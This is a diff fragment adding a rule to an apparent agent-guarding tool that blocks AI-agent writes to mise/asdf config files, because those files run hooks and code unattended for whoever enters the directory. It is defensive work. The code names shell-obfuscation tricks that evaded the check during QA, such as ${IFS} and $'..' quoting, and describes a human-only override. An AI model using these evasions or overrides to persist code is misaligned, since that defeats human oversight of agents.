+            found = _mise_new_unsafe(ev, p, kind)
+        if not found:
+            return None
+        if os.environ.get("AEGIS_ALLOW_MISE_EXEC") or _mise_allowed_path(cfg, p):
+            return None
+        shown = ", ".join(found[:5]) + (", ..." if len(found) > 5 else "")
+        return _finish(Decision(action, "mise-exec-protect",
+                         f"'{p}' is a mise/asdf config or runtime file, and this "
+                         f"write adds: {shown}. mise loads it on every prompt/"
+                         "`cd` into the project (and on every `mise exec`/shim "
+                         "call), so hooks, `_.source`, exec-bearing env vars, "
+                         "template exec(), plugins or code-fetching tool "
+                         "backends run unattended for whoever enters the "
+                         "directory next. Review the change, then confirm with "
+                         "AEGIS_ALLOW_MISE_EXEC=1; a spawned agent cannot."))
+
+    if _is_shell(ev):
+        raw = re.sub(r"\$\{?IFS\}?", " ", _cmd(ev))
+        cmd = normalize.scan_surface(raw, sep="\n")
+        writes = False
+        if (patterns.mise_shell_path_hit(cmd) or patterns.mise_shell_path_hit(raw)
+                or patterns.mise_cwd_hit(raw, ev.cwd)
+                # The scan rendering decodes `$'..'` (QA round 11: `mi$'s'e`).
+                or ("$'" in raw and patterns.mise_cwd_hit(cmd, ev.cwd))):
+            writes = not (patterns.mise_shell_only_reads(cmd)
+                          and patterns.mise_shell_only_reads(raw))
+        cli = "" if writes else (patterns.mise_cli_hit(cmd) or patterns.mise_cli_hit(raw))
+        if not (writes or cli):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_MISE_EXEC")
+                or _mise_allowed_cmd(cfg, raw)):
+            return None
+        what = ("A mise/asdf config file or plugin/shim directory is being "
+                "written from a shell" if writes else cli)
+        return _finish(Decision(action, "mise-exec-protect",
+                         f"{what} -- mise runs a config's hooks, `_.source` "
+                         "scripts, env exports and template exec() on every "
+                         "prompt/`cd` into the project once it is trusted, "
+                         "unattended. A human may append '# aegis-allow', or "
+                         "set AEGIS_ALLOW_MISE_EXEC=1; a spawned agent cannot."))
+    return None
+
+
 _CORE_RULES = (
     rule_attest_session,
     rule_containment,
@@ -15302,6 +15934,7 @@ _CORE_RULES = (
     rule_http_client_config_protect,
     # Any-write ASK; same tail-block reason as above.
     rule_editor_startup_protect,
+    rule_mise_exec_protect,
     rule_agent_rules_protect,
 )
 
